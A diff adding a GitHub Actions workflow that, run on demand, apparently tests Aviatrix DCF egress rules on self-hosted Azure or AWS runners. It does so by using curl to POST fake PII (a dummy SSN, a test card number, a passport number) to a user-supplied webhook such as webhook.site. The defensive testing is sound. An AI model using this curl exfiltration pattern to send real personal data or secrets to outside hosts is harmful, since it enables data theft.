@@ -1,0 +1,144 @@
+name: Test PII Exfiltration (self-hosted runners)
+
+# Run on demand only. The user sets webhook_url to a free endpoint
+# (e.g. https://webhook.site/<uuid>) and picks which cloud(s) to test.
+# Between retries they can modify Aviatrix DCF rules and re-run to
+# observe allow vs. deny behaviour. Only matrix legs for clouds whose
+# runners are currently online are dispatched (same pattern as test-egress.yml).
+on:
+  workflow_dispatch:
+    inputs:
+      webhook_url:
+        description: 'Target webhook URL (e.g. https://webhook.site/your-unique-id)'
+        required: true
+        type: string
+      cloud:
+        description: 'Which cloud to run on'
+        required: true
+        type: choice
+        options:
+          - azure
+          - aws
+      retries:
+        description: 'Number of POST attempts per cloud'
+        required: false
+        default: '3'
+        type: string
+
+jobs:
+  # Build runtime matrix — only include clouds whose runners are deployed.
+  # workflow_dispatch honours the cloud input; we trust the user to pick
+  # a cloud whose self-hosted runner is currently online.
+  resolve-clouds:
+    runs-on: ubuntu-latest
+    outputs:
+      clouds: ${{ steps.set.outputs.clouds }}
+    steps:
+      - id: set
+        env:
+          INPUT_CLOUD: ${{ inputs.cloud }}
+        run: |
+          case "$INPUT_CLOUD" in
+            azure) CLOUDS='["azure"]' ;;
+            aws)   CLOUDS='["aws"]' ;;
+          esac
+          echo "clouds=$CLOUDS" >> "$GITHUB_OUTPUT"
+          echo "Selected clouds: $CLOUDS"
+
+  pii-exfil-test:
+    needs: resolve-clouds
+    if: needs.resolve-clouds.outputs.clouds != '[]'
+    strategy:
+      fail-fast: false
+      matrix:
+        cloud: ${{ fromJson(needs.resolve-clouds.outputs.clouds) }}
+    runs-on: [self-hosted, "${{ matrix.cloud }}", linux, x64]
+    name: pii-exfil (${{ matrix.cloud }})
+    timeout-minutes: 10
+
+    steps:
+      - name: Validate inputs
+        run: |
+          if [[ "${{ inputs.webhook_url }}" != http* ]]; then
+            echo "::error::webhook_url must start with http"
+            exit 1
+          fi
+          echo "Webhook : ${{ inputs.webhook_url }}"
+          echo "Retries : ${{ inputs.retries }}"
+          echo "Cloud   : ${{ matrix.cloud }}"
+
+      - name: Fetch message of the day
+        run: |
+          echo "### MOTD (https://www.example.com)" >> "$GITHUB_STEP_SUMMARY"
+          HTTP=$(curl -sf -o /tmp/motd.html -w "%{http_code}" --max-time 8 https://www.example.com 2>/dev/null)
+          if [ "$HTTP" = "200" ]; then
+            echo "::notice::MOTD fetch succeeded (HTTP $HTTP) — egress to www.example.com is unblocked"
+            echo "✅ MOTD fetch HTTP $HTTP — www.example.com reachable" >> "$GITHUB_STEP_SUMMARY"
+          else
+            echo "::warning::MOTD fetch failed (HTTP ${HTTP:-timeout}) — www.example.com may be blocked by DCF"
+            echo "❌ MOTD fetch HTTP ${HTTP:-—} — www.example.com unreachable" >> "$GITHUB_STEP_SUMMARY"
+          fi
+
+      - name: POST fake PII to webhook
+        id: exfil
+        run: |
+          WEBHOOK="${{ inputs.webhook_url }}"
+          RETRIES=$(( ${{ inputs.retries }} ))
+          PASS=0; FAIL=0
+
+          PAYLOAD=$(cat <<'JSON'
+          {
+            "ssn": "123-45-6789",
+            "credit_card": "4111-1111-1111-1111",
+            "email": "victim@example.com",
+            "dob": "1985-04-12",
+            "address": "742 Evergreen Terrace, Springfield",
+            "passport": "AB1234567"
+          }
+          JSON
+          )
+
+          echo "### PII exfil test (${{ matrix.cloud }})" >> "$GITHUB_STEP_SUMMARY"
+          echo "Webhook: \`$WEBHOOK\`  |  Retries: $RETRIES" >> "$GITHUB_STEP_SUMMARY"
+          echo "" >> "$GITHUB_STEP_SUMMARY"
+          echo "| Attempt | Result | HTTP | Time |" >> "$GITHUB_STEP_SUMMARY"
+          echo "|---------|--------|------|------|" >> "$GITHUB_STEP_SUMMARY"
+
+          for i in $(seq 1 "$RETRIES"); do
+            T0=$(date +%s%3N)
+            HTTP=$(curl -s -X POST "$WEBHOOK" \
+              -H "Content-Type: application/json" \
+              -H "User-Agent: pii-exfil-test/1.0" \
+              -d "$PAYLOAD" \
+              -o /tmp/resp_$i.txt \
+              -w "%{http_code}" \
+              --max-time 8 2>/dev/null)
+            EXIT=$?
+            T1=$(date +%s%3N)
+            MS=$(( T1 - T0 ))
+
+            if [ $EXIT -eq 0 ] && [ -n "$HTTP" ] && [ "$HTTP" -ge 200 ] && [ "$HTTP" -lt 300 ]; then
+              echo "::notice::[${{ matrix.cloud }}] attempt $i PASS (HTTP $HTTP, ${MS}ms)"
+              echo "| $i | ✅ PASS | $HTTP | ${MS}ms |" >> "$GITHUB_STEP_SUMMARY"
+              PASS=$(( PASS + 1 ))
+            else
+              REASON="blocked/timeout"
+              [ -n "$HTTP" ] && [ "$HTTP" != "000" ] && REASON="HTTP $HTTP"
+              echo "::warning::[${{ matrix.cloud }}] attempt $i FAIL ($REASON, ${MS}ms) — check Aviatrix DCF logs"
+              echo "| $i | ❌ FAIL | ${HTTP:-—} | ${MS}ms |" >> "$GITHUB_STEP_SUMMARY"
+              FAIL=$(( FAIL + 1 ))
+            fi
+          done
+
+          echo "" >> "$GITHUB_STEP_SUMMARY"
+          echo "**Result: $PASS/$RETRIES succeeded**" >> "$GITHUB_STEP_SUMMARY"
+
+          echo "pass=$PASS" >> "$GITHUB_OUTPUT"
+          echo "fail=$FAIL" >> "$GITHUB_OUTPUT"
+
+      - name: Summarise
+        run: |
+          echo "[${{ matrix.cloud }}] PASS=${{ steps.exfil.outputs.pass }}  FAIL=${{ steps.exfil.outputs.fail }}"
+          if [ "${{ steps.exfil.outputs.fail }}" -gt 0 ]; then
+            echo "::warning::${{ steps.exfil.outputs.fail }} attempt(s) were blocked or timed out — check Aviatrix DCF logs for deny hits"
+          fi
